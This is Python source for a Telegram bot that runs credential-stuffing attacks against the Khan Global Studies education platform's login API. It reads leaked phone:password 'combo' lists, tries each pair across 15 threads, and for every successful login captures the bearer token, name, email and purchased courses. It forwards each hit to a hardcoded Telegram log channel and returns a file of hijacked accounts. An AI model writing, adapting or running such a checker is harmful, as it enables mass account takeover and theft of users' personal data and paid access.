import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from functools import partial
import os
import time
import random

# --- CONFIG ---
MAX_THREADS = 15
LOG_CHANNEL = -1004441498543
print_lock = threading.Lock()
log_lock = threading.Lock()

# --- HELPERS ---
def get_batches(token):
    """Fetch paid batches/courses"""
    url = "https://api.khanglobalstudies.com/v1/courses/paid?medium=0"
    headers = {
        'authorization': f'Bearer {token}',
        'accept': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.json()
        return []
    except:
        return []

def parse_combo(line):
    """Original parsing logic - WORKING"""
    line = line.strip()
    if not line:
        return None
    
    try:
        # Logic: Piche se (Right side) split karna
        if ":" in line:
            parts = line.rsplit(":", 2)
            phone = parts[-2]
            password = parts[-1]
        elif "*" in line:
            parts = line.rsplit("*", 2)
            phone = parts[-2]
            password = parts[-1]
        else:
            return None
        
        # Clean extra spaces
        phone = phone.strip()
        password = password.strip()
        
        if not phone or not password:
            return None
        
        return phone, password
    except:
        return None

# --- BOT LOGIC ---
def check_account(line, bot, chat_id, hits_list, state, total_lines):
    parsed = parse_combo(line)
    if not parsed:
        with print_lock:
            state['checked'] += 1
            update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
        return

    phone, password = parsed
    
    login_url = "https://api.khanglobalstudies.com/cms/login?medium=0"
    headers = {
        'content-type': 'application/json',
        'accept': 'application/json',
        'origin': 'https://www.khanglobalstudies.com',
        'referer': 'https://www.khanglobalstudies.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    payload = {"phone": phone, "password": password, "remember": True}

    try:
        # Step 1: Login
        res = requests.post(login_url, json=payload, headers=headers, timeout=10)
        data = res.json()

        if data.get("type") == "login_success":
            token = data.get("token")
            user_data = data.get("user", {})
            name = user_data.get("name", "N/A")
            email = user_data.get("email", "N/A")
           
            # Step 2: Fetch Batches
            batches = get_batches(token)

            # Step 3: Result Handling
            with print_lock:
                state['hits'] += 1
                state['checked'] += 1
                
                # DETAILED FORMAT
                hit_text = "📱 *APP NAME : KHAN GS*\n\n"
                hit_text += "🔑 *Your Login Credentials 🪪 :*\n"
                hit_text += f"🆔 *Phone*Password :* `{phone}*{password}`\n"
                hit_text += f"🎫 *Authorization Token :* `{token}`\n\n"
                hit_text += f"👤 *Name :* {name}\n"
                hit_text += f"📧 *Email :* `{email}`\n"
                hit_text += f"📱 *Phone :* `{phone}`\n\n"
                hit_text += f"🎓 *Courses ({len(batches)}):*\n\n"
                
                if batches:
                    for b in batches:
                        b_title = b.get('title', 'Unknown')
                        b_id = b.get('id', 'N/A')
                        hit_text += f"📚 *ID :* `{b_id}`\n"
                        hit_text += f"*Batch Name :* {b_title}\n\n"
                else:
                    hit_text += "• No Batches Found (Empty Account)\n"
                
                hits_list.append(hit_text)
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
                
                # Log Channel with DELAY
                def send_log():
                    time.sleep(random.uniform(0.3, 0.8))
                    with log_lock:
                        try:
                            bot.send_message(LOG_CHANNEL, hit_text, parse_mode="Markdown", disable_web_page_preview=True)
                        except:
                            pass
                
                threading.Thread(target=send_log).start()
        else:
            with print_lock:
                state['checked'] += 1
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)

    except Exception as e:
        with print_lock:
            state['checked'] += 1
            update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)

def update_progress(bot, chat_id, msg_id, hits, checked, total):
    try:
        if total > 0:
            progress_percent = int((checked / total) * 10)
            bar = "■" * progress_percent + "▢" * (10 - progress_percent)
        else:
            bar = "■■▢▢▢▢▢"
        
        progress_text = f"""╭───☀ 𝖢𝖧𝖢𝖪𝖭𝖦 ☀───╮
┣ ⚙️ {bar} 
┣ 📊 Hit : {hits}
┣ 📂 Loaded : {checked}/{total}
┣ 🔥 Status : Checking...
╰─── 𝐡𝐚𝐧 𝐆𝐒 𝐁𝐨 ───╯"""
        
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=progress_text)
    except:
        pass

def run_check(bot, chat_id, progress_msg_id, combo_file, platform_name):
    hits_list = []
    
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f.readlines() if l.strip()]

    total_lines = len(lines)
    state = {'hits': 0, 'checked': 0, 'msg_id': progress_msg_id}
    
    func = partial(check_account, bot=bot, chat_id=chat_id, hits_list=hits_list, state=state, total_lines=total_lines)
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(func, lines)

    # Wait for logs
    time.sleep(2)

    # Final File
    final_filename = "kgs_hit.txt"
    if hits_list and state['hits'] > 0:
        with open(final_filename, "w", encoding="utf-8") as f:
            for hit in hits_list:
                f.write(hit)

        with open(final_filename, "rb") as f:
            bot.send_document(chat_id, f, caption=f"✅ {platform_name} Valid Hits ({state['hits']})")
        
        if os.path.exists(final_filename):
            os.remove(final_filename)
    else:
        bot.send_message(chat_id, "❌ No valid hits found.")

    try:
        bot.delete_message(chat_id, progress_msg_id)
    except:
        pass
        
    if os.path.exists(combo_file):
        os.remove(combo_file)
